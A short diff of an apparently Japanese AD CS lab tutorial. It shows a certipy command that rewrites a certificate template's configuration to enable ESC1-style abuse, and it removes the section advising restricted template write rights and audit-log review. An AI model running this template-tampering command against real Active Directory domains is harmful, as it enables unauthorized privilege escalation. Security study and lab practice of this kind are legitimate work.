@@ -27,8 +27,3 @@ certipy template -u user@lab.local -p 'Password123' -template 'VulnTemplate' \
   -dc-ip <DC_IP> -write-default-configuration
 # 以降は ESC1 と同手順で悪用
 ```
-
-## 注意点
-
-- テンプレートへの書き込み権限は、テンプレートの作成・保守を行う運用グループに限定すべきで、一般ユーザーグループに広く付与されていないか定期的に確認する。
-- 悪用後は `certipy` で設定を元に戻すオプションもあるため、侵害調査の際はテンプレートの変更履歴（監査ログ）も確認するとよい。
